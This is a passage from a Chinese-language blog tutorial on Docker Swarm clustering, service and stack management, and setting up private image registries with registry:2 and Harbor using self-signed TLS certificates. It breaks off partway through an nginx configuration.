quit</span><br></pre></td></tr></table></figure>

<h1 id="7-docker集群"><a href="#7-docker集群" class="headerlink" title="7. docker集群"></a>7. docker集群</h1><h2 id="7-1-docker-swarm（集群搭建）"><a href="#7-1-docker-swarm（集群搭建）" class="headerlink" title="7.1 docker swarm（集群搭建）"></a>7.1 docker swarm（集群搭建）</h2><ol>
<li>端口说明</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 摘自：https://stackoverflow.com/questions/62580470/add-a-vm-running-ubuntu-as-a-worker-node-in-docker-swarm</span><br><span class="line">The network ports required for a Docker Swarm to function properly are:</span><br><span class="line">TCP port 2376 for secure Docker client communication. This port is required for Docker Machine to work. Docker Machine is used to orchestrate Docker hosts.</span><br><span class="line">TCP port 2377. This port is used for communication between the nodes of a Docker Swarm or cluster. It only needs to be opened on manager nodes.</span><br><span class="line">TCP and UDP port 7946 for communication among nodes (container network discovery).</span><br><span class="line">UDP port 4789 for overlay network traffic (container ingress networking).</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>搭建过程</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里使用5台机器，3主2从（3个管理节点、2个工作节点），管理节点可以执行管理相关指令</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Raft一致性协议：超过半数才能提供正常服务，swarm的管理节点的leader节点正是如此，3个管理节点，允许宕机1个管理节点</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">管理节点开放的端口：</span></span><br><span class="line">firewall-cmd --zone=public --add-port=2376/tcp --add-port=2377/tcp --add-port=7946/tcp --add-port=7946/udp --add-port=4789/udp --permanent &amp;&amp; firewall-cmd --reload &amp;&amp; firewall-cmd --list-ports</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工作节点开放的端口（不需要开放2377/tcp）：</span></span><br><span class="line">firewall-cmd --zone=public --add-port=2376/tcp --add-port=7946/tcp --add-port=7946/udp --add-port=4789/udp --permanent &amp;&amp; firewall-cmd --reload &amp;&amp; firewall-cmd --list-ports</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">初始化集群，执行后当前节点为管理节点。</span></span><br><span class="line">docker swarm init --advertise-addr &lt;要成为管理节点的其中一个IP&gt;</span><br><span class="line">[root@localhost ~]# docker swarm init --advertise-addr &lt;具体IP&gt;</span><br><span class="line">Swarm initialized: current node (zmnhrsdxyexkfk8dvqcgsf5qv) is now a manager.</span><br><span class="line">To add a worker to this swarm, run the following command（提示执行如下命令，将节点添加到集群，并成为工作节点）:</span><br><span class="line">    docker swarm join --token SWMTKN-1-xxx port:ip</span><br><span class="line">To add a manager to this swarm, run &#x27;docker swarm join-token manager&#x27; and follow the instructions.（在当前节点执行这条命令，返回结果中的命令用来添加管理节点，类似上面的添加工作节点的命令。）</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看节点情况</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在管理节点上查看，工作节点无法使用管理相关的指令，结果ID后带*的为当前服务器节点信息</span></span><br><span class="line">[root@localhost ~]# docker node ls</span><br><span class="line">ID                            HOSTNAME                STATUS    AVAILABILITY   MANAGER STATUS   ENGINE VERSION</span><br><span class="line">e4kl69tmtrm2ws0u1aw7x0gri     localhost.localdomain   Ready     Active         Reachable        20.10.6</span><br><span class="line">uega8ry9ivqqwx1v6jj781ckz     localhost.localdomain   Ready     Active                          20.10.6</span><br><span class="line">wsv43jyd2a37qdnu9cd5gcbpe     localhost.localdomain   Ready     Active         Reachable        20.10.6</span><br><span class="line">ymd6kpxd1tk4py7xgbxf42huh     localhost.localdomain   Ready     Active                          20.10.6</span><br><span class="line">zmnhrsdxyexkfk8dvqcgsf5qv *   localhost.localdomain   Ready     Active         Leader           20.10.6</span><br></pre></td></tr></table></figure>

<h2 id="7-2-docker-service（服务管理）"><a href="#7-2-docker-service（服务管理）" class="headerlink" title="7.2 docker service（服务管理）"></a>7.2 docker service（服务管理）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker service --<span class="built_in">help</span></span></span><br><span class="line">[root@localhost ~]# docker service --help</span><br><span class="line">Usage:  docker service COMMAND</span><br><span class="line">Manage services</span><br><span class="line">Commands:</span><br><span class="line">  create      Create a new service</span><br><span class="line">  inspect     Display detailed information on one or more services</span><br><span class="line">  logs        Fetch the logs of a service or task</span><br><span class="line">  ls          List services</span><br><span class="line">  ps          List the tasks of one or more services</span><br><span class="line">  rm          Remove one or more services</span><br><span class="line">  rollback    Revert changes to a service&#x27;s configuration</span><br><span class="line">  scale       Scale one or multiple replicated services</span><br><span class="line">  update      Update a service</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建服务，docker service create --<span class="built_in">help</span>，相比docker run，它能够扩缩容器。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">由于replicas can only be used with replicated mode，global模式也就是无法扩缩容，每个节点均只有一个服务容器，默认replicated模式。</span></span><br><span class="line">docker service create -p 10000:80 --name my-nginx [--mode replicated|global] nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看服务</span></span><br><span class="line">docker service ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扩容为8个副本，在每台机器上docker ps查看容器具体在哪台机器上启动</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方法一：</span></span><br><span class="line">docker service update --replicas 8 my-nginx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方法二：</span></span><br><span class="line">docker service scale my-nginx=8</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问服务</span></span><br><span class="line">curl &lt;集群任一IP&gt;:10000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">移除服务</span></span><br><span class="line">docker service rm my-nginx</span><br></pre></td></tr></table></figure>

<h2 id="7-3-docker-stack（堆栈管理）"><a href="#7-3-docker-stack（堆栈管理）" class="headerlink" title="7.3 docker stack（堆栈管理）"></a>7.3 docker stack（堆栈管理）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker stack --<span class="built_in">help</span></span></span><br><span class="line">[root@localhost ~]# docker stack --help</span><br><span class="line">Usage:  docker stack [OPTIONS] COMMAND</span><br><span class="line">Manage Docker stacks</span><br><span class="line">Options:</span><br><span class="line">      --orchestrator string   Orchestrator to use (swarm|kubernetes|all)</span><br><span class="line">Commands:</span><br><span class="line">  deploy      Deploy a new stack or update an existing stack</span><br><span class="line">  ls          List stacks</span><br><span class="line">  ps          List the tasks in the stack</span><br><span class="line">  rm          Remove one or more stacks</span><br><span class="line">  services    List the services in the stack</span><br><span class="line">Run &#x27;docker stack COMMAND --help&#x27; for more information on a command.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker stack deploy帮助命令</span></span><br><span class="line">[root@localhost ~]# docker stack deploy --help</span><br><span class="line">Usage:  docker stack deploy [OPTIONS] STACK</span><br><span class="line">Deploy a new stack or update an existing stack</span><br><span class="line">Aliases:</span><br><span class="line">  deploy, up</span><br><span class="line">Options:</span><br><span class="line">  -c, --compose-file strings   Path to a Compose file, or &quot;-&quot; to read from stdin</span><br><span class="line">      --orchestrator string    Orchestrator to use (swarm|kubernetes|all)</span><br><span class="line">      --prune                  Prune services that are no longer referenced</span><br><span class="line">      --resolve-image string   Query the registry to resolve image digest and supported platforms</span><br><span class="line">                               (&quot;always&quot;|&quot;changed&quot;|&quot;never&quot;) (default &quot;always&quot;)</span><br><span class="line">      --with-registry-auth     Send registry authentication details to Swarm agents</span><br><span class="line">      </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">集群启动或更新（也就可以通过docker-compose.yml来修改分片数量），集群管理命令，需要在管理节点执行，摘自：https://docs.docker.com/engine/reference/commandline/stack_deploy/</span></span><br><span class="line">docker stack deploy -c docker-compose.yml &lt;自定义stack名称&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出stack</span></span><br><span class="line">docker stack ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看指定stack中的services</span></span><br><span class="line">docker stack services &lt;stack名称&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有service</span></span><br><span class="line">docker service ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有节点分片的日志</span></span><br><span class="line">docker service logs &lt;日志id&gt;</span><br><span class="line">[root@localhost ~]# docker service logs --help</span><br><span class="line">Usage:  docker service logs [OPTIONS] SERVICE|TASK</span><br><span class="line">Fetch the logs of a service or task</span><br><span class="line">Options:</span><br><span class="line">      --details        Show extra details provided to logs</span><br><span class="line">  -f, --follow         Follow log output</span><br><span class="line">      --no-resolve     Do not map IDs to Names in output</span><br><span class="line">      --no-task-ids    Do not include task IDs in output</span><br><span class="line">      --no-trunc       Do not truncate output</span><br><span class="line">      --raw            Do not neatly format logs</span><br><span class="line">      --since string   Show logs since timestamp (e.g. 2013-01-02T13:23:37Z) or relative (e.g. 42m for 42 minutes)</span><br><span class="line">  -n, --tail string    Number of lines to show from the end of the logs (default &quot;all&quot;)</span><br><span class="line">  -t, --timestamps     Show timestamps</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看stack启动错误日志</span></span><br><span class="line">docker stack ps &lt;stack名称&gt; --no-trunc</span><br></pre></td></tr></table></figure>

<h2 id="7-4-compose、service、stack比较"><a href="#7-4-compose、service、stack比较" class="headerlink" title="7.4 compose、service、stack比较"></a>7.4 compose、service、stack比较</h2><ul>
<li>docker compose：需要额外安装，用于镜像构建、容器编排，只能用于单机，可指定分片数。</li>
<li>docker service：不需要额外安装，用于运行容器，相对docker run，可指定分片数，结合docker swarm可实现多机器集群部署。</li>
<li>docker stack：不需要额外安装，用于容器编排（通过docker-compose.yml），结合docker swarm可实现多机器集群部署，需要预先构建或拉取镜像。不支持第2版的yml配置，不支持docker-compose中的配置：build、cgroup_parent、container_name、devices、tmpfs、external_links、links、network_mode、restart、security_opt、userns_mode。（集群下的多个容器服务编排）</li>
</ul>
<h1 id="8-部署常用软件"><a href="#8-部署常用软件" class="headerlink" title="8. 部署常用软件"></a>8. 部署常用软件</h1><h2 id="8-1-私服搭建"><a href="#8-1-私服搭建" class="headerlink" title="8.1 私服搭建"></a>8.1 私服搭建</h2><h3 id="8-1-1-registry"><a href="#8-1-1-registry" class="headerlink" title="8.1.1 registry"></a>8.1.1 registry</h3><ol>
<li>证书目录、认证信息目录、仓库数据卷目录的创建，并配置hosts（域名：registry.loc）</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /opt/docker/registry/auth /opt/docker/registry/certs /opt/docker/registry/registry</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>认证信息创建</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/docker/registry</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果原本存在htpasswd文件，则用&gt;&gt;进行追加，这里的testuser为用户名，testpassword为用户密码</span></span><br><span class="line">docker run --entrypoint htpasswd httpd:2 -Bbn testuser testpassword &gt; auth/htpasswd		</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>证书的生成</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成证书私钥(key)</span></span><br><span class="line">openssl genrsa -out domain.key 4096</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成自签署证书(crt)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">openssl req -new -x509 -days 3650 -key domain.key -out domain.crt</span></span><br><span class="line">openssl req -new -x509 -days 3650 -subj &quot;/C=CN/ST=GD/L=GZ/O=org/OU=orgUnit/CN=registry.loc&quot; -key domain.key -out domain.crt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把证书文件移到/opt/docker/registry/certs下，最终在容器启动时，同步到容器中</span></span><br><span class="line">mv domain.* certs/</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>启动容器</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-p 5000:5000 \</span><br><span class="line">--restart=always \</span><br><span class="line">--name registry \</span><br><span class="line">-v /opt/docker/registry/auth:/auth \</span><br><span class="line">-e &quot;REGISTRY_AUTH=htpasswd&quot; \</span><br><span class="line">-e &quot;REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm&quot; \</span><br><span class="line">-e REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd \</span><br><span class="line">-v /opt/docker/registry/certs:/certs \</span><br><span class="line">-v /opt/docker/registry/registry:/var/lib/registry \</span><br><span class="line">-e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/domain.crt \</span><br><span class="line">-e REGISTRY_HTTP_TLS_KEY=/certs/domain.key \</span><br><span class="line">registry:2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以通过这个参数控制registry容器EXPOSE的端口，这里不配置</span></span><br><span class="line">-e REGISTRY_HTTP_ADDR=0.0.0.0:5000 \</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>修改配置，使其支持自生成的证书</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Ⅰ.方法1：修改/etc/docker/daemon.json，在registry-mirrors节点同层级后添加&quot;insecure-registries&quot;:[&quot;registry.loc:5000&quot;]</span><br><span class="line">Ⅱ.方法2：修改/usr/lib/systemd/system/docker.service，在ExecStart的命令后面添加参数--insecure-registry registry.loc:5000</span><br><span class="line">最后，执行：sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker 进行重新加载并重启。</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>测试push到私服</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取hello-world镜像，以做测试</span></span><br><span class="line">docker pull hello-world			</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">为hello-world打tag，registry.loc:5000为私服host:ip</span></span><br><span class="line">docker tag hello-world registry.loc:5000/hw		</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把打了tag的镜像push到私服中</span></span><br><span class="line">docker push registry.loc:5000/hw</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">提示还没认证：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Using default tag: latest</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The push refers to repository [registry.loc:5000/hw]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">f22b99068db9: Preparing</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">no basic auth credentials</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录到私服</span></span><br><span class="line">docker login registry.loc:5000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">正确输入用户名密码后，提示登录成功：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Username: testuser</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Password:</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">WARNING! Your password will be stored unencrypted <span class="keyword">in</span> /root/.docker/config.json.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Configure a credential helper to remove this warning. See</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://docs.docker.com/engine/reference/commandline/login/#credentials-store</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Login Succeeded</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新push</span></span><br><span class="line">docker push registry.loc:5000/hw</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看私服的镜像，或者在浏览器打开https://registry.loc:5000/v2/_catalog</span></span><br><span class="line">curl --user testuser:testpassword https://registry.loc:5000/v2/_catalog --insecure</span><br></pre></td></tr></table></figure>

<h3 id="8-1-2-harbor（推荐）"><a href="#8-1-2-harbor（推荐）" class="headerlink" title="8.1.2 harbor（推荐）"></a>8.1.2 harbor（推荐）</h3><p> 说明这里使用的是harbor-offline-installer-v2.4.2.tgz（addr: <a href="https://github.com/goharbor/harbor/releases/tag/v2.4.2">Release v2.4.2 · goharbor&#x2F;harbor · GitHub</a>），要求</p>
<p> 硬件：cpu2<del>4、内存4</del>8GB、硬盘40~160GB</p>
<p> 软件：Docker 17.06.0-ce+ 、Docker Compose 1.18.0+ 、Openssl</p>
<ol>
<li>把下载到的harbor-offline-installer-v2.4.2.tgz进行解压，并配置hosts（域名：harbor.loc）</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf harbor-offline-installer-v2.4.2.tgz -C /opt</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>开放端口并查看端口，这里使用的是https，因此开放443</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=443/tcp --permanent &amp;&amp; firewall-cmd --reload &amp;&amp; firewall-cmd --zone=public --list-ports</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>配置https</li>
</ol>
<ul>
<li>生成CA证书密钥、CA证书、服务器证书密钥、服务器证书，也可以使用 <a href="https://he-zhifei.github.io/2021/07/26/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4(centos)/#Openssl%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6">Openssl生成证书| Zhifei’s Blog </a> 替代。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成 CA 证书私钥</span></span><br><span class="line">openssl genrsa -out ca.key 4096</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成 CA 证书</span></span><br><span class="line">openssl req -x509 -new -nodes -sha512 -days 3650 \</span><br><span class="line"> -subj &quot;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=harbor.loc&quot; \</span><br><span class="line"> -key ca.key \</span><br><span class="line"> -out ca.crt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成服务器证书私钥</span></span><br><span class="line">openssl genrsa -out harbor.loc.key 4096</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成服务器证书签名请求 （CSR）</span></span><br><span class="line">openssl req -sha512 -new \</span><br><span class="line">    -subj &quot;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=harbor.loc&quot; \</span><br><span class="line">    -key harbor.loc.key \</span><br><span class="line">    -out harbor.loc.csr</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成 x509 v3 扩展文件</span></span><br><span class="line">cat &gt; v3.ext &lt;&lt;-EOF</span><br><span class="line">authorityKeyIdentifier=keyid,issuer</span><br><span class="line">basicConstraints=CA:FALSE</span><br><span class="line">keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment</span><br><span class="line">extendedKeyUsage = serverAuth</span><br><span class="line">subjectAltName = @alt_names</span><br><span class="line"></span><br><span class="line">[alt_names]</span><br><span class="line">DNS.1=harbor.loc</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用该文件v3.ext为 Harbor 主机生成证书</span></span><br><span class="line">openssl x509 -req -sha512 -days 3650 \</span><br><span class="line">    -extfile v3.ext \</span><br><span class="line">    -CA ca.crt -CAkey ca.key -CAcreateserial \</span><br><span class="line">    -in harbor.loc.csr \</span><br><span class="line">    -out harbor.loc.crt</span><br></pre></td></tr></table></figure>

<ul>
<li>配置证书</li>
</ul>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将服务器证书和密钥复制到 Harbor 主机上的证书文件夹中</span></span><br><span class="line">mkdir -p /data/cert/</span><br><span class="line">cp harbor.loc.crt harbor.loc.key /data/cert/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">crt转换为cert</span></span><br><span class="line">openssl x509 -inform PEM -in harbor.loc.crt -out harbor.loc.cert</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将服务器证书、密钥和 CA 证书复制到 Harbor 主机上的 Docker 证书文件夹中</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">若使用默认的443端口，则文件夹名不需要加:443，否则需要加上具体的端口号，即：/etc/docker/certs.d/harbor.loc:port</span></span><br><span class="line">mkdir -p /etc/docker/certs.d/harbor.loc/</span><br><span class="line">cp harbor.loc.cert harbor.loc.key ca.crt /etc/docker/certs.d/harbor.loc/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启docker服务</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从模板文件上创建harbor.yml</span></span><br><span class="line">cp /opt/harbor/harbor.yml.tmpl /opt/harbor/harbor.yml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改如下harbor配置，具体参数说明https://goharbor.io/docs/2.4.0/install-config/configure-yml-file/</span></span><br><span class="line">vim /opt/harbor/harbor.yml</span><br><span class="line">hostname: harbor.loc</span><br><span class="line">https:</span><br><span class="line">  certificate: /data/cert/harbor.loc.crt</span><br><span class="line">  private_key: /data/cert/harbor.loc.key</span><br><span class="line">:wq</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到hadbor根目录</span></span><br><span class="line">cd /opt/harbor/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行脚本以启用 HTTPS</span></span><br><span class="line">./prepare</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建、启动harbor相关容器</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止、移除，数据保留在文件系统中，并不会丢失。</span></span><br><span class="line">docker-compose down -v</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">正常开启/停止/重启命令使用</span></span><br><span class="line">docker-compose start/stop/restart</span><br><span class="line"></span><br><span class="line">重点注意：</span><br><span class="line">1.启动后harbor的各个容器数据保留在/data下；</span><br><span class="line">2./data/cert/下的证书是给harbor用的，而/etc/docker/certs.d/harbor.loc[:port]/是给docker用的。也就是说，假如使用的是自己创建的证书，在每一个有docker客户端的地方都需要创建这样的文件夹，存放这些证书，同时也需要配置hosts；</span><br><span class="line">3.若docker客户端没有配置证书（正常情况客户端需要配置证书），则需要增加如下配置：</span><br><span class="line">	Ⅰ.方法1：修改/etc/docker/daemon.json，在registry-mirrors节点同层级后添加&quot;insecure-registries&quot;:[&quot;harbor.loc&quot;]</span><br><span class="line">	Ⅱ.方法2：修改/usr/lib/systemd/system/docker.service，在ExecStart的命令后面添加参数--insecure-registry harbor.loc</span><br><span class="line">	最后，执行：sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker 进行重新加载并重启。</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>配置harbor组件间TLS，即<a href="https://goharbor.io/docs/2.4.0/install-config/configure-internal-tls/">组件之间使用https进行通信</a>。（建议，非必须）</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建证书保存路径</span></span><br><span class="line">mkdir -p /opt/harbor/internal-tls/certs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用goharbor/prepare:v2.4.2自动生成各个证书</span></span><br><span class="line">docker run -v /:/hostfs goharbor/prepare:v2.4.2 gencert -p /opt/harbor/internal-tls/certs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改配置项</span></span><br><span class="line">vim /opt/harbor/harbor.yml</span><br><span class="line">internal_tls:</span><br><span class="line">  enabled: true</span><br><span class="line">  dir: /opt/harbor/internal-tls/certs</span><br><span class="line">:wq</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启harbor</span></span><br><span class="line">docker-compose down -v</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><p>访问harbor，访问：<a href="https://harbor.loc,默认用户名admin、密码harbor12345,默认有library项目,或创建新项目(push时用到)./">https://harbor.loc，默认用户名admin、密码Harbor12345，默认有library项目，或创建新项目（push时用到）。</a></p>
</li>
<li><p>测试docker push</p>
</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录私服</span></span><br><span class="line">docker login harbor.loc -u admin -p Harbor12345</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动并创建容器</span></span><br><span class="line">docker run -it --name hw hello-world</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">提交容器，构建成harbor.loc/library/hw:v1.0.0，harbor.loc-私服地址，library-项目名称，hw-镜像名称，v1.0.0-tag</span></span><br><span class="line">docker commit -a &quot;submit&quot; -m &quot;test&quot; hw harbor.loc/library/hw:v1.0.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tag指令：docker tag SOURCE_IMAGE[:TAG] harbor.loc/library/REPOSITORY[:TAG]</span></span><br><span class="line">docker tag harbor.loc/library/hw:v1.0.0 harbor.loc/library/hw-tag:v1.0.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">push指令：docker push harbor.loc/library/REPOSITORY[:TAG]</span></span><br><span class="line">docker push harbor.loc/library/hw:v1.0.0			# 没打tag</span><br><span class="line">docker push harbor.loc/library/hw-tag:v1.0.0		# 打tag</span><br></pre></td></tr></table></figure>

<h2 id="8-2-安装nginx"><a href="#8-2-安装nginx" class="headerlink" title="8.2 安装nginx"></a>8.2 安装nginx</h2><ol>
<li>保存默认的default.conf</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /opt/docker/nginx/conf.d &amp;&amp; cat &lt;&lt;&#x27;EOF&#x27;&gt;/opt/docker/nginx/conf.d/default.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    listen  [::]:80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    #access_log  /var/log/nginx/host.access.log  main;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    proxy_pass   http://127.0.0.1;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    root           html;</span><br><span class="line">    #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    #    fastcgi_index  index.php;</span><br><span class="line">    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">    #    include        fastcgi_params;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # deny access to 